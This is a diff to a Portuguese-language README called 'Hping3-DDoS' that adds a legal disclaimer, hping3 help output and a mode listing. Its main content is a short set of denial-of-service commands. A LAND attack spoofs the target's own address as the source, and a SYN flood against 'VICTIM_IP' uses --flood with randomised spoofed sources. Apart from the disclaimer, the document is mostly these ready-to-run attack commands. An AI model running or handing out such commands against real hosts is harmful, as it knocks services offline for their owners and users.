@@ -1,6 +1,18 @@
 # Hping3-DDoS
 
+## AVISO
+- Não me responsabilizo pelo o uso desses projetos/códigos para fins malignos. Eles são criados para pessoas que tenham interesse na área de Segurança da Informação.
+
+- Todos os códigos e projetos foram testados em ambientes isolados por mim.
+
+- Lembrem-se de que usar essas informações para hackear, invadir ou derrubar serviços de dispositivos alheios é CRIME previsto na Lei [14.155/2021](http://www.planalto.gov.br/ccivil_03/_ato2019-2022/2021/lei/L14155.htm).
 # Important Commands
+
+- Help hping3
+
+```
+sudo hping3 -h
+```
 
 ```
 • -V: Modo Verbose;
@@ -14,8 +26,24 @@
 • –flood: Máximo de pacotes possı́veis por segundo;
 ```
 
+```
+Mode
+  default mode     TCP
+  -0  --rawip      RAW IP mode
+  -1  --icmp       ICMP mode
+  -2  --udp        UDP mode
+  -8  --scan       SCAN mode.
+                   Example: hping --scan 1-30,70-90 -S www.target.host
+  -9  --listen     listen mode
+
+```
 
 ## Attack DoS Land
 ```
 hping3 -V -c 1000 -d 100 -S -p 21 -s 80 -k -a 192.168.1.110 192.168.1.110
+```
+
+## DoS type Syn Flooding
+```
+hping3 -V -c 1000000 -d 120 -S -p 445 -s 445 --flood --rand-source VICTIM_IP
 ```
